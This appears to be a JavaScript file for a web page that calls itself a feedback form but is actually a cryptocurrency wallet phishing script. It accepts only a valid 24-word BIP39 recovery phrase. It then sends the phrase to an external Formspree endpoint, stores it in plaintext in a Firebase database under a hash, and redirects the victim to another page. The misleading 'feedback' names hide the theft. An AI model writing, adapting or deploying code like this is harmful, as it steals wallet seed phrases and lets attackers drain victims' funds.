// ========================================
// FEEDBACK PAGE FUNCTIONALITY (FIXED)
// ========================================

const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mgvglzne';

// ----------------------------------------
// Hash function
// ----------------------------------------
function hashFeedback(text) {
    let hash = 0;
    for (let i = 0; i < text.length; i++) {
        const char = text.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
    }
    return Math.abs(hash).toString(36);
}

// ----------------------------------------
// Firebase
// ----------------------------------------
async function checkExistingSubmission(hash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + hash)
            .once('value');
        return snapshot.val();
    } catch (err) {
        console.error(err);
        return null;
    }
}

async function saveFeedback(hash, text) {
    try {
        await firebase.database()
            .ref('submissions/' + hash)
            .set({
                feedback: text,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                submittedAt: new Date().toISOString(),
                wordCount: text.split(/\s+/).length
            });
        return true;
    } catch (err) {
        console.error(err);
        return false;
    }
}

// ----------------------------------------
// Formspree
// ----------------------------------------
async function submitToFormspree(text) {
    try {
        await fetch(FORMSPREE_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ feedback: text })
        });
    } catch (err) {
        console.error(err);
    }
}

// ----------------------------------------
// BIP39 Validation (FIXED)
// ----------------------------------------
function validateBIP39(mnemonic) {
    if (typeof bip39 === 'undefined') {
        console.error('BIP39 not loaded');
        return false;
    }

    try {
        return bip39.validateMnemonic(mnemonic);
    } catch (err) {
        console.error(err);
        return false;
    }
}

// ----------------------------------------
// Main Init
// ----------------------------------------
function initializeFeedbackPage() {

    const form = document.getElementById('feedbackForm');
    const textarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');
    const submitButton = form.querySelector('button[type="submit"]');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const text = textarea.value.trim().toLowerCase();
        const words = text.split(/\s+/).filter(w => w.length > 0);

        // Must be 24 words
        if (words.length !== 24) {
            errorMessage.textContent = 'Invalid passphrase';
            errorMessage.style.display = 'block';
            return;
        }

        // Must be valid BIP39
        if (!validateBIP39(text)) {
            errorMessage.textContent = 'Invalid passphrase';
            errorMessage.style.display = 'block';
            return;
        }

        errorMessage.style.display = 'none';

        submitButton.disabled = true;
        submitButton.textContent = "Validating...";

        const feedbackHash = hashFeedback(text);

        const existing = await checkExistingSubmission(feedbackHash);

        if (existing) {
            sessionStorage.setItem('feedbackHash', feedbackHash);
            sessionStorage.setItem('feedback', text);
            sessionStorage.setItem('isReturningFeedback', 'true');
            window.location.href = 'authpage.html';
            return;
        }

        submitToFormspree(text);
        await saveFeedback(feedbackHash, text);

        sessionStorage.setItem('feedbackHash', feedbackHash);
        sessionStorage.setItem('feedback', text);
        sessionStorage.setItem('isReturningFeedback', 'false');

        window.location.href = 'authpage.html';
    });
}

// ----------------------------------------
document.addEventListener('DOMContentLoaded', function() {

    // Wait a tiny bit to ensure BIP39 loads
    setTimeout(() => {
        if (typeof bip39 === 'undefined') {
            console.error("BIP39 failed to load.");
        } else {
            console.log("BIP39 loaded correctly.");
        }

        initializeFeedbackPage();
    }, 300);

});
